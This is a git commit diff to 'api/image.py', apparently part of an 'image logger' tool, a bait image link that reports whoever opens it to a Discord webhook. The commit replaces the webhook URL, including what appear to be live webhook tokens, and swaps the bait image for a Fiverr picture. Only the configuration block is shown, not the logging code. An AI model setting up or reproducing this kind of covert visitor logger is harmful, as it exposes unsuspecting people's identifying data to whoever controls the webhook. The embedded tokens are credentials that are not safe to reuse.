df2e96188a01257ce96643c50121c7e343e2ec48
ilfonai <fonailaci0601@gmail.com>
2025-07-20 13:23:24 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1392181400895230033/AbRqHp8_KuKZPTG9XoF3hB8Jsf9cq21gNV8sCI8AEwaZ7WY17xg8OjuImm1ChTWii81Q",
+    "image": "https://fiverr-res.cloudinary.com/images/q_auto,f_auto/gigs/269199926/original/260a4fc9607df5d54daaf20b9fae2411d34c3685/make-you-a-custom-fivem-citizen-or-gun-sound-or-rehsade-preset.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
